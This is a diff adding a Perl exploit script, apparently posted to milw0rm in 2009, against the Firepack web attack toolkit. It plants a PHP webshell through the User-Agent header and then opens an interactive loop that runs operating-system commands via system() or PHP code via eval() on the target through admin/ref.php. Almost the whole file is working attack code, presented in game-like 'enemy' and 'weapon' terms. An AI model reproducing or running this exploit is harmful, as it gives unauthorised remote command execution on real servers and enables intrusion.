@@ -1,0 +1,82 @@
+#!/usr/bin/perl
+#
+# Firepack - Remote Command\Code Execution Exploit
+#
+# Firepack is a web atting toolkit often used in 2008, when the most
+# versions of it were published. A short time ago i looked though the
+# sourcecode and noticed that Vulnerability which can be used
+# if the admin doesn't use a .htaccess protection in his admin area.
+# WARNING: When accessing the index.php, malware could be executed
+# so i recommend to execute it in a virtual environment.
+# Username and password are located in config.php in the main folder
+
+print("
+################################################
+
+Firepack - Remote Command/Code Execution Exploit
+
+Date:                        17.02.2009
+Vulnerability discovered by: Lidloses_Auge
+Exploit coded by:            Lidloses_Auge
+Greetz to:                   -=Player=- , Suicide,
+                             g4ms3, enco, Palme, GPM, 
+                             karamble, Free-Hack
+
+################################################
+
+Use:
+
+1) Your enemy
+
+	URL (e.g. http://localhost/FirePack/)
+	
+2) Weapons
+
+	1 = Remote Command Execution (OS Commands)
+	2 = Remote Code Execution (PHP Commands)
+
+################################################
+
+Select the enemy now:
+
+\t");
+$enemy = <STDIN>;
+$enemy = substr($enemy,0,length($enemy)-1);
+print "\nChoose your weapon!\n\n\t";
+$choice = <STDIN>;
+$choice = substr($choice,0,length($choice)-1);
+
+if ($choice == 1 | $choice == 2) {
+	print "\n>>> Entering the ship!";
+	use LWP::Simple;
+	use LWP::UserAgent;
+	my $ua = LWP::UserAgent->new;
+	$param[0] = "cmd";
+	$param[1] = "code";
+	$param[2] = "system";
+	$param[3] = "eval";
+	$code = "<?php if(isset(\$_GET['$param[$choice-1]'])){echo 'fp_$param[$choice-1]1';$param[$choice+1](\$_GET['$param[$choice-1]']);echo 'fp_$param[$choice-1]2';die;} ?>";
+	$ua->agent($code);
+	$req = HTTP::Request->new(GET => $enemy."index.php");
+	$req->header('Accept' => 'text/html');
+	$res = $ua->request($req);
+	if (!($res->is_success)) {
+		print "\nFailed! Wrong enemy dude?\n";
+	} else {
+		print "\nWelcome aboard, warrior! Try some commands ('quit' to exit):";
+		$splitlen = length("fp_".$param[$choice-1])+1;
+		$key = "fp_".$param[$choice-1];
+		while (substr($cmd,0,length($cmd)-1) ne "quit") {
+			print "\n\n>Do: ";
+			$cmd = <STDIN>;
+			if (substr($cmd,0,length($cmd)-1) ne "quit") {
+				$src = get($enemy."admin/ref.php?$param[$choice-1]=$cmd");
+				print "\n".substr($src,index($src,$key."1")+$splitlen,index($src,$key."2")-index($src,$key."1")-$splitlen);
+			}
+		}
+	}
+} else {
+	print "\nWanna fight without weapon? No way dude!";
+}
+
+# milw0rm.com [2009-02-18]
